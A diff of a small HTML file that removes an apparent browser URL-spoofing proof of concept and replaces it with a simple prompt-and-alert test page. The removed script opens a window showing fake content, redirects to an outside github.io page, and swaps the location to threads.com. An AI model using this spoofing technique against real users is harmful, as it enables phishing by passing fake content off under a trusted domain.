@@ -1,18 +1,11 @@
+
+<!DOCTYPE html>
 <html>
- <head>
-  <script>
-  function next() {
-         w.location.replace('https://threads.com');
-        }
+<body>
+<script>
+const result = prompt("Enter test label:");
 
-  function f() {
-    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://xnxrx.github.io/xnurx/threads.html'");
-
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
-  }
+alert("Received: " + result);
 </script>
- </head>
- <body>
-  <center><a href="#" onclick="f()">Click For POC</a></center>
- </body>
+</body>
 </html>
